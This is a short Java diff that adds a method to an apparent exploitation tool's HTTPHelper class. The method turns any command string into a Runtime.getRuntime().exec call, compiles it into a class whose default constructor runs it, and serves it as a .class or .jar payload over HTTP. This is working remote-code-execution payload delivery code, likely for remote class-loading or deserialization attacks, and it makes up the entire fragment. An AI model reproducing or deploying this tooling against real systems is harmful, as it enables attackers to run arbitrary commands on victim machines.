@@ -22,6 +22,28 @@ public class HTTPHelper {
         server.start();
     }
 
+    public static HttpHandler makeHTTPHandler(String filename, String body) throws Exception {
+        HttpHandler handler = null;
+        if(body.startsWith("code:")){
+            body = body.substring(5);
+        }else{
+            body = "java.lang.Runtime.getRuntime().exec(\"" +
+                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                    "\");";
+        }
+
+        byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
+                filename.replace(".class",""), body);
+
+        if(filename.endsWith(".class")){
+            handler = new PayloadHandler(obj);
+        }else if(filename.endsWith(".jar")){
+            handler = new PayloadHandler(
+                    ClassFiles.makeJarFile(filename, obj));
+        }
+        return handler;
+    }
+
 
     public static class PayloadHandler implements HttpHandler {
 
